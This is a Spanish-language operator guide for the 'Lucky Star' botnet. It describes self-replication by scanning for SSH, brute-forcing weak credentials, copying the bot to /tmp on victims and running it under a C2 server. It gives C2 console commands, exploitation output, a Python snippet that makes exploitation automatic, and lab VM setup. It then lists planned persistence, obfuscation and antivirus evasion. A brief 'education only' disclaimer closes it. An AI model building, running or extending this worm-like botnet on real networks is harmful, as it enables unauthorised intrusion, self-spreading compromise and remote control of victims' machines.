# 🦠 Guía de Auto-Replicación - Lucky Star Botnet

## ¿Se replicará automáticamente?

### ✅ SÍ, si:
1. Hay hosts con SSH abierto (puerto 22)
2. Esos hosts tienen credenciales débiles
3. Python3 está instalado en el host víctima
4. El bot tiene permisos de escritura en /tmp

### ❌ NO, si:
- Solo escaneas sin usar `exploit`
- No hay hosts vulnerables en la red
- Los hosts tienen contraseñas fuertes
- El firewall bloquea el tráfico

## 🔄 Cómo Funciona la Replicación

```
┌─────────────────────────────────────────────────────┐
│  1. Bot inicial se conecta al C2                    │
│  2. C2 ordena: "recon 1"                            │
│  3. Bot escanea red local                           │
│  4. Bot encuentra: 192.168.1.50:22 (SSH)            │
│  5. Bot intenta credenciales débiles                │
│  6. ¡Acceso exitoso con admin:admin!                │
│  7. Bot se copia a 192.168.1.50:/tmp/bot_soldier.py │
│  8. Bot ejecuta: python3 bot_soldier.py &           │
│  9. Nuevo bot en 192.168.1.50 se conecta al C2     │
│ 10. ¡Replicación exitosa!                          │
└─────────────────────────────────────────────────────┘
```

## 📋 Flujo Completo de Replicación

### Paso 1: Iniciar C2
```bash
python c2_commander.py
```

### Paso 2: Ejecutar Bot Inicial
```bash
# Asegúrate de configurar C2_IP correctamente
python bot_soldier.py
```

### Paso 3: Ordenar Reconocimiento
```
★彡 Comandante> recon 1
[*] Orden de reconocimiento enviada
```

### Paso 4: Ver Hosts Vulnerables
```
★彡 Comandante> list 1

[1] 192.168.1.50:22 - OpenSSH 7.4
    Vulnerabilidades:
      1. SSH Weak Credentials
         Exploit: Brute Force Attack
```

### Paso 5: Explotar (Auto-Replicación)
```
★彡 Comandante> exploit 1 1 auto

[*] Orden de explotación enviada
[+] Acceso SSH exitoso: admin@192.168.1.50
[+] Bot copiado a 192.168.1.50:/tmp/bot_soldier.py
[+] Bot replicado y ejecutándose en 192.168.1.50
```

### Paso 6: Verificar Nueva Conexión
```
[+] Nuevo bot conectado: victim-192.168.1.50 desde 192.168.1.50
```

## 🎯 Estrategias de Replicación

### Replicación Pasiva (Manual)
```bash
# Esperar a que el operador ordene exploit
★彡 Comandante> exploit <bot> <host> auto
```

### Replicación Agresiva (Automática)
Modifica `bot_soldier.py`:
```python
# En scan_network(), después de encontrar vulnerabilidades SSH:
if port == 22 and vulns:
    # Auto-explotar inmediatamente
    print(f"[*] Auto-explotando {ip_str}...")
    exploit_ssh(ip_str, port, 'auto')
```

## 🧪 Prueba en Laboratorio

### Configurar VMs de Prueba

**VM1: Kali (C2 Server)**
```bash
# IP: 192.168.56.10
sudo apt install python3 python3-pip
pip3 install paramiko netaddr cryptography scapy
python3 c2_commander.py
```

**VM2: Ubuntu (Víctima)**
```bash
# IP: 192.168.56.20
sudo apt install openssh-server python3
# Crear usuario vulnerable:
sudo useradd -m -s /bin/bash admin
echo "admin:admin" | sudo chpasswd
sudo systemctl start ssh
```

**VM3: Ejecutar Bot Inicial**
```bash
# Editar bot_soldier.py:
C2_IP = '192.168.56.10'

# Ejecutar:
python3 bot_soldier.py
```

### Verificar Replicación

```bash
# En VM2 (víctima), después de la explotación:
ps aux | grep bot_soldier
ls -la /tmp/bot_soldier.py
```

## 🚨 Señales de Replicación Exitosa

En el **C2 verás**:
```
[+] Nuevo bot conectado: ubuntu-192.168.56.20
[*] Informe recibido: ubuntu-192.168.56.20
```

En el **Bot inicial verás**:
```
[+] Acceso SSH exitoso: admin@192.168.56.20
[+] Bot copiado a 192.168.56.20:/tmp/bot_soldier.py
[+] Bot replicado y ejecutándose en 192.168.56.20
```

## 🔒 Limitaciones Actuales

1. **Solo SSH**: Por ahora solo replica via SSH
2. **Python requerido**: Host víctima debe tener Python3
3. **No persistente**: Bot se pierde al reiniciar
4. **Sin ofuscación**: Código visible en /tmp

## 🚀 Mejoras Futuras

Para hacer la replicación más efectiva:

1. **Compilar a binario** (PyInstaller)
2. **Múltiples vectores** (FTP, SMB, etc)
3. **Persistencia** (crontab, systemd)
4. **Ofuscación** de código
5. **Evasión** de antivirus

## ⚠️ Recordatorio Legal

Este sistema es **SOLO para educación** en redes controladas.
- ✅ Usar en tu propio lab
- ✅ Con permiso explícito
- ❌ NUNCA en redes reales sin autorización

---

**¿Preguntas?** Revisa los logs del bot y del C2 para diagnosticar problemas.
